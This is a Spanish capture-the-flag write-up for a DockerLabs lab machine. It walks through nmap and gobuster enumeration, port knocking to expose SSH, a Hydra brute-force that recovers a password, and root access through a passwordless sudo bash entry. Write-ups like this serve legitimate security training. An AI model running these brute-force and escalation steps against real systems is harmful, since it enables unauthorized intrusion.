Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #port-knocking #ssh #brute-force

![](../assets/Pasted image 20251111220929.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad:
```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.288 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.288/0.288/0.288/0.000 ms
```

Ahora, procedo a realizar un escaneo con nmap para ver que puertos están abiertos:
```bash
> nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 172.17.0.2
------------------------------------------------------------- 
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 72:F4:83:41:09:BF (Unknown)
```

- Puerto 80 HTTP

Ahora procedo a realizar un segundo escaneo sobre los puertos abiertos para descubrir versiones y servicios que están corriendo
```bash
> nmap -p 80 -sCV --min-rate 5000 -Pn -n -vvv 172.17.0.2 -oN target.txt
---------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: 72:F4:83:41:09:BF (Unknown)
```

- Puerto 80: Apache httpd 2.4.58 ((Ubuntu))
## Enumeración

**Puerto 80 HTTP**

- Pagina default de apache2
![](../assets/Pasted image 20251111213632.png)

Procedo a realizar fuzzing con gobuster para descubrir recursos ocultos.
- Aquí me encuentro el archivo _qdefense.txt_
```bash
> gobuster dir -w directory-list-2.3-medium.txt -u http://172.17.0.2/ -x html,php,py,txt,phar,js
-------------------------------------------------------------------------------------------------
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.phar                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10792]
/.php                 (Status: 403) [Size: 275]
/qdefense.txt         (Status: 200) [Size: 111]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.phar                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
```

**qdefense.txt**

- lo importante aquí es el _toctoc 7000 8000 9000_. Sabiendo que nmap solo pudo identificar un puerto abierto esta frase me hace pensar que pueda existir algun puerto que pueda descubrir a traves del Port Knocking y que toctoc sea algun usuario.
![](../assets/Pasted image 20251111213750.png)

**Port Knocking**
El Port knocking es una técnica para ocultar un puerto detras de una "contraseña" que consiste en una secuencia de conexiones de red a puertos específicos para que el puerto objetivo se abra momentáneamente a nuestra IP.

Realizo Port Knocking con la herramienta `knockd` usando la secuencia dada
```bash
> knock 172.17.0.2 7000 8000 9000
```

Para verificar que si se efectivamente se abrió algún puerto, vuelvo a realizar un escaneo con nmap
- Puerto 22 SSH abierto
```bash

> nmap -p- -sCV --min-rate 5000 -Pn -n -vvv 172.17.0.2 -oN target.txt
----------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 dc:ef:4e:ec:c9:3e:3d:68:dd:f5:1f:23:21:a3:98:83 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPS7n1A1eIxBuRhMdsVQA1jRG8wdysmEZiaohqGafMbS+pLcfCIIx72ZM52ZQk2IICu9yUlJ36aWcwUEJLZOcVI=
|   256 3e:c1:74:c1:44:af:6f:d0:90:15:4c:95:46:0a:ea:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOu2/XQXey3Lb+jyGxtHholEH5Znu26WzWLDN/K6zL2Q
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 72:F4:83:41:09:BF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Explotación

Ahora, sabiendo que el puerto 22 esta abierto y que _toctoc_ es un posible usuario procedí a realizar un ataque de fuerza bruta con Hydra
```bash
> hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 20
----------------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
```

- Credenciales: toctoc:kittycat


Procedo a conectarme
```bash
> ssh toctoc@172.17.0.2
```

![](../assets/Pasted image 20251111220554.png)
## Escalada de Privilegios

Procedo a enumerar binarios con privilegios de SUDO:
```bash
> sudo -l
---------------------------------------------------------------------------------------------------
toctoc@c561ed7e00d4:~$ sudo -l
User toctoc may run the following commands on c561ed7e00d4:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

- Aqui me encuentro el binario bash


Ahora con ayuda de GTFObins exploto el binario bash para escalar a root:
```bash
> toctoc@c561ed7e00d4:~$ sudo /opt/bash
```

![](../assets/Pasted image 20251111220534.png)

***PWNED**